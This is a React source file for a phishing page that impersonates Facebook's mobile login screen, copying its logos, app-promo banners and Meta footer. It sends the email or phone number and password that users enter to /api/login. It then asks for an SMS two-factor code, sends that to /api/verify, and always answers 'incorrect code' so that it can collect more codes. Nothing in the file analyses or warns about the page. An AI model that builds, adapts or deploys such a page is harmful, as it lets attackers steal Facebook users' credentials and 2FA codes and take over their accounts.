/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { ChevronDown, Download, Loader2, ArrowLeft, HelpCircle, RotateCcw } from "lucide-react";
import { motion } from "framer-motion";
import { useState, useEffect } from "react";

export default function App() {
  const [step, setStep] = useState<'login' | '2fa'>('login');
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [timer, setTimer] = useState(178); // 02:58 in seconds

  useEffect(() => {
    let interval: any;
    if (step === '2fa' && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleLogin = async () => {
    if (!identifier || !password) {
      setError("Please enter your credentials");
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier, password }),
      });

      if (response.ok) {
        setStep('2fa');
      } else {
        const data = await response.json();
        setError(data.error || "Login failed. Please try again.");
      }
    } catch (err) {
      setError("An error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerifyCode = async () => {
    if (!verificationCode) return;

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ identifier, code: verificationCode }),
      });

      if (response.ok) {
        // After sending the code, we can show an error or redirect
        setTimeout(() => {
          setError("Código incorrecto. Por favor, inténtalo de nuevo.");
          setVerificationCode("");
          setIsLoading(false);
        }, 1500);
      } else {
        setError("Error al verificar el código.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Error de conexión.");
      setIsLoading(false);
    }
  };

  if (step === '2fa') {
    return (
      <div className="min-h-screen bg-white font-sans text-[#1c1e21] flex flex-col px-6 pt-4">
        {/* Header */}
        <div className="flex justify-between items-center mb-6">
          <button onClick={() => setStep('login')} className="p-1">
            <ArrowLeft size={24} strokeWidth={2.5} />
          </button>
          <HelpCircle size={24} strokeWidth={2} className="text-gray-700" />
        </div>

        {/* Title & Subtitle */}
        <h1 className="text-[26px] font-bold mb-2">Revisa tus SMS</h1>
        <p className="text-[16px] text-gray-700 mb-6">
          Ingresa el código que enviamos.
        </p>

        {/* Illustration */}
        <div className="w-full aspect-[16/10] bg-[#e8f3f8] rounded-[32px] flex items-center justify-center mb-8 overflow-hidden relative">
          <img 
            src="https://www.image2url.com/r2/default/images/1776276299117-b7eedd31-60b2-433d-b6aa-f0f4c75fbb96.jpeg" 
            alt="Security Illustration" 
            className="w-full h-full object-cover"
            referrerPolicy="no-referrer"
          />
        </div>

        {/* Input */}
        <div className="mb-6">
          <input
            type="text"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
            placeholder="Ingresa el código"
            className="w-full px-4 py-4 border border-gray-300 rounded-2xl text-[17px] focus:outline-none focus:border-[#1877F2]"
          />
          {error && <p className="text-red-600 text-sm mt-2 text-center">{error}</p>}
        </div>

        {/* Timer */}
        <div className="flex items-center gap-2 text-gray-600 text-[15px] mb-10">
          <RotateCcw size={20} />
          <span>Podremos enviar un nuevo código en {formatTime(timer)}.</span>
        </div>

        {/* Buttons */}
        <div className="flex flex-col gap-3">
          <button
            onClick={handleVerifyCode}
            disabled={isLoading || !verificationCode}
            className="w-full bg-[#a8c7fa] text-white font-bold py-3.5 rounded-full text-[16px] flex items-center justify-center gap-2 disabled:bg-[#a8c7fa] disabled:opacity-80"
            style={{ backgroundColor: verificationCode ? '#1877F2' : '#a8c7fa' }}
          >
            {isLoading && <Loader2 className="animate-spin" size={20} />}
            Continuar
          </button>
          <button className="w-full bg-[#f0f2f5] text-[#1c1e21] font-bold py-3.5 rounded-full text-[16px]">
            Usar otro método
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans text-[#1c1e21] flex flex-col">
      {/* Top Banner - App Promo */}
      <div className="flex items-center justify-between px-4 py-2 border-b border-gray-200">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 bg-[#1877F2] rounded-lg flex items-center justify-center overflow-hidden">
            <svg viewBox="0 0 24 24" className="w-10 h-10 fill-white translate-y-2 translate-x-1">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
          </div>
          <div>
            <h1 className="font-bold text-[15px] leading-tight">Facebook</h1>
            <p className="text-[13px] text-gray-500">Open in the Facebook app</p>
          </div>
        </div>
        <button className="bg-[#1877F2] text-white font-bold px-5 py-1.5 rounded-full text-[14px] uppercase tracking-wide">
          OPEN
        </button>
      </div>

      {/* Secondary Banner - iOS Promo */}
      <div className="flex items-center gap-2 px-4 py-3 text-[#1877F2] text-[14px] font-medium border-b border-gray-100">
        <Download size={18} strokeWidth={2.5} />
        <span>Get Facebook for iOS and browse faster.</span>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col items-center px-4 pt-8 pb-12">
        <div className="flex items-center gap-1 text-gray-500 text-[14px] mb-12">
          <span>English (UK)</span>
          <ChevronDown size={14} />
        </div>

        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.4 }}
          className="mb-10"
        >
          <svg viewBox="0 0 24 24" className="w-16 h-16 fill-[#1877F2]">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
        </motion.div>

        <div className="w-full max-w-[400px] flex flex-col gap-3">
          {error && (
            <div className="bg-red-50 text-red-600 p-3 rounded-lg text-sm mb-2 text-center border border-red-100">
              {error}
            </div>
          )}
          <div className="relative">
            <input
              type="text"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder="Mobile number or email address"
              className="w-full px-4 py-3.5 bg-white border border-gray-300 rounded-2xl text-[16px] placeholder:text-gray-500 focus:outline-none focus:border-[#1877F2] transition-colors"
            />
          </div>
          <div className="relative">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full px-4 py-3.5 bg-white border border-gray-300 rounded-2xl text-[16px] placeholder:text-gray-500 focus:outline-none focus:border-[#1877F2] transition-colors"
            />
          </div>

          <button 
            onClick={handleLogin}
            disabled={isLoading}
            className="w-full bg-[#1877F2] text-white font-bold py-3 rounded-full text-[17px] mt-2 active:scale-[0.98] transition-transform shadow-sm flex items-center justify-center gap-2 disabled:opacity-70"
          >
            {isLoading && <Loader2 className="animate-spin" size={20} />}
            {isLoading ? "Logging in..." : "Log in"}
          </button>

          <button className="text-[15px] font-bold text-[#1c1e21] mt-5 hover:underline">
            Forgotten password?
          </button>
        </div>

        <div className="flex-1 min-h-[40px]" />

        <div className="w-full max-w-[400px] mt-12 mb-10">
          <button className="w-full border border-[#1877f2] text-[#1877f2] font-bold py-2.5 rounded-full text-[15px] active:bg-blue-50 transition-colors">
            Create new account
          </button>
        </div>

        {/* Meta Logo Footer */}
        <div className="flex flex-col items-center gap-3">
          <div className="flex items-center gap-1 text-gray-500">
            <svg viewBox="0 0 24 24" className="w-5 h-5 fill-gray-500">
              <path d="M16.41 9.1c-1.25 0-2.31.63-3.11 1.59-.3-.36-.66-.67-1.06-.92-1.07-.67-2.37-.84-3.56-.47-1.19.37-2.18 1.24-2.71 2.39-.53 1.15-.53 2.46 0 3.61.53 1.15 1.52 2.02 2.71 2.39 1.19.37 2.49.2 3.56-.47.4-.25.76-.56 1.06-.92.8.96 1.86 1.59 3.11 1.59 2.26 0 4.09-1.83 4.09-4.09S18.67 9.1 16.41 9.1zm-7.1 7.1c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3zm7.1 0c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z" />
            </svg>
            <span className="text-[16px] font-bold text-gray-500 tracking-tight">Meta</span>
          </div>
          <div className="flex gap-4 text-[12px] text-gray-500 font-medium">
            <span>About</span>
            <span>Help</span>
            <span>More</span>
          </div>
        </div>
      </div>
    </div>
  );
}
